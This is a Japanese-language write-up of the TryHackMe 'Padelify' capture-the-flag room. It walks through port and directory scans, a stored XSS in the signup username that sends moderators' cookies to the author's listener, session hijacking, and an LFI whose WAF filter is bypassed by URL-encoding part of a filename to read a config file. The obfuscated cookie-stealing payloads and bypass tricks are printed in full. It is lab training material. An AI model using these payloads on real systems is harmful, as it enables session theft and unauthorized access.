# Padelify CTF

https://tryhackme.com/room/padelify

## Enumeration

```shell
TARGET=10.65.189.133
sudo bash -c "echo $TARGET   padelity.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

SSH, HTTPのみ。

```sh
root@ip-10-65-76-23:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.65.189.133
+ Target Hostname:    padelity.thm
+ Target Port:        80
+ Start Time:         2025-11-22 01:11:59 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ Server leaks inodes via ETags, header found with file /1OTvGVDE.ini, fields: 0xb38 0x643139370245f 
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /logs/: Directory indexing found.
+ OSVDB-3092: /logs/: This might be interesting...
+ /login.php: Admin login page/section found.
+ 1707 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2025-11-22 01:12:01 (GMT0) (2 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

- `Cookie PHPSESSID created without the httponly flag` -> XSSを念頭に置く。
- /logs に注意。

### ディレクトリ列挙

```sh
dirb http://padelity.thm

---- Scanning URL: http://padelity.thm/ ----
==> DIRECTORY: http://padelity.thm/config/                                                                                
==> DIRECTORY: http://padelity.thm/css/                                                                                   
+ http://padelity.thm/index.php (CODE:200|SIZE:3853)                                                                      
==> DIRECTORY: http://padelity.thm/javascript/                                                                            
==> DIRECTORY: http://padelity.thm/js/                                                                                    
==> DIRECTORY: http://padelity.thm/logs/                                                                                  
+ http://padelity.thm/server-status (CODE:403|SIZE:2872)                                                                  
                                                                                                                          
---- Entering directory: http://padelity.thm/config/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://padelity.thm/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://padelity.thm/javascript/ ----
==> DIRECTORY: http://padelity.thm/javascript/jquery/                                                                     
                                                                                                                          
---- Entering directory: http://padelity.thm/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://padelity.thm/logs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                          
---- Entering directory: http://padelity.thm/javascript/jquery/ ----
+ http://padelity.thm/javascript/jquery/jquery (CODE:200|SIZE:289782)
```

### /logs

```
[Sat Nov 08 12:03:11.123456 2025] [info] [pid 2345] Server startup: Padelify v1.4.2
[Sat Nov 08 12:03:11.123789 2025] [notice] [pid 2345] Loading configuration from /var/www/html/config/app.conf
[Sat Nov 08 12:05:02.452301 2025] [warn] [modsec:99000005] [client 10.10.84.50:53122] NOTICE: Possible encoded/obfuscated XSS payload observed
[Sat Nov 08 12:08:12.998102 2025] [error] [pid 2361] DBWarning: busy (database is locked) while writing registrations table
[Sat Nov 08 12:11:33.444200 2025] [error] [pid 2378] Failed to parse admin_info in /var/www/html/config/app.conf: unexpected format
[Sat Nov 08 12:12:44.777801 2025] [notice] [pid 2382] Moderator login failed: 3 attempts from 10.10.84.99
[Sat Nov 08 12:13:55.888902 2025] [warn] [modsec:41004] [client 10.10.84.212:53210] Double-encoded sequence observed (possible bypass attempt)
[Sat Nov 08 12:14:10.101103 2025] [error] [pid 2391] Live feed: cannot bind to 0.0.0.0:9000 (address already in use)
[Sat Nov 08 12:20:00.000000 2025] [info] [pid 2401] Scheduled maintenance check completed; retention=30 days
```

- /var/www/html/config/app.conf ファイルに admin_info の項目がある。
- 難読化XSSペイロードが検出されている。
- 同じIPから3回ログイン失敗したらログ出力される。
- 二重エンコードが検出される。
- 9000ポートがローカルで使用されている。
- 30日間隔のメンテナンスチェックがスケジュールされている。

### /config/app.conf

アクセスしたらWAFにブロックされた。

### ユーザー登録

ユーザー登録したら、下記表示。

```
Registration submitted - a moderator will review your request.
```

入力したユーザー名でログインしようとしたが、できなかった。  
XSSでモデレータのセッションID入手を目指す。

### XSS

ドロップダウンの項目も文字列として送信されている。

```http
username=thm&password=thm&level=amateur&game_type=single
```

levelとして下記送ったらブロックされた。

```html
<IMG SRC=/ onerror="eval('fe'+'tch(`http://192.168.128.202:8000/${doc'+'ument.c'+'ookie}`)')"></img>
```

ユーザー名に下記ペイロードを付けて成功した。

```js
<script>Function("fe" + "tch('http://192.168.128.202:8000?c='" +"+ btoa(do" + "cument.coo" + "kie) );")()</script>
```

異なるIDが次々に送られてくるが、1つを選んでセットしたらダッシュボードにアクセスできた。

```sh
$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.65.189.133 - - [21/Nov/2025 21:03:36] "GET /?c=UEhQU0VTU0lEPXFhdDJvbHRtdmk5b2lvOXRuZzJrbmcwaW1h HTTP/1.1" 200 -
10.65.189.133 - - [21/Nov/2025 21:03:45] "GET /?c=UEhQU0VTU0lEPThmb29mbnI0M2luYzFrbmE0amlkamtzY3Js HTTP/1.1" 200 -
10.65.189.133 - - [21/Nov/2025 21:03:53] "GET /?c=UEhQU0VTU0lEPXJpNmZuaWlsYWg5Y3E2bDNuazZtaGJuZmpw HTTP/1.1" 200 -
10.65.189.133 - - [21/Nov/2025 21:04:02] "GET /?c=UEhQU0VTU0lEPWY0OXU5NGpucXYzdWhrNzNkYnV0cTdqaWJw HTTP/1.1" 200 -
```

## dashboard

http://padelity.thm/live.php?page=match.php

いかにもLFIを狙えそうな形。/config/app.conf を目指す。

### 長さ切り捨てバイパス

ブロックされ失敗

`http://padelity.thm/live.php?page=config/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././app.conf`

### URLエンコード

app.conf という文字列に反応しているようなので、`/config/app%2econf` とすることでWAFバイパスできた。

```
version = "1.4.2" enable_live_feed = true enable_signup = true env = "staging" site_name = "Padelify Tournament Portal" max_players_per_team = 4 maintenance_mode = false log_level = "INFO" log_retention_days = 30 db_path = "padelify.sqlite" admin_info = "[REDACTED]" misc_note = "do not expose to production" support_email = "support@padelify.thm" build_hash = "a1b2c3d4"
```

入手したパスワードを使ってadminログインして完了。

## 振り返り

- 最近、WAF系のウォークスルーやCTFを頻繁にみるので比較的スムーズに進んだ。

## Tags

#tags:XSSフィルターバイパス #tags:XSS #tags:LFI
